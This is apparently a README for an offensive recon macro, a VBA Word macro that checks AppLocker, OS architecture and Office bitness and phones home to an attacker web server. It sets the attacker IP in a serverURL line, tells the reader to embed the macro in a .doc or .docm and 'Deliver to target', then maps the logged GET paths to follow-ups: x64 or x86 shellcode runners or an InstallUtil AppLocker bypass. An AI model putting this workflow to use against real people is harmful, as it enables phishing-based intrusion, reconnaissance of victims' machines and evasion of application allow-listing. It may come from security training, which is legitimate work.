# Recon Macro

## Files

| File | Purpose |
|---|---|
| `starter-word-macro.vba` | VBA macro — probes AppLocker, OS arch, Office bitness and phones home |

## Usage

**1. Update the attacker IP in `starter-word-macro.vba`:**
```vb
serverURL = "http://192.168.45.229" & path
```

**2. Start the web server:**
```bash
sudo systemctl start apache2
tail -f /var/log/apache2/access.log    # watch the GET path
```

**3. Insert into Word:**
1. Open Word → `Alt+F11` → Insert → Module
2. Paste the full contents of `starter-word-macro.vba`
3. Save as `.doc` or `.docm`
4. Deliver to target

**4. Read the GET path in your server logs:**

| Path | Next step |
|---|---|
| `/applockeroff/os64_word64` | Deploy x64 shellcode runner |
| `/applockeroff/os64_word32` | Deploy x86 shellcode runner |
| `/applockeron/...` | Use InstallUtil bypass |
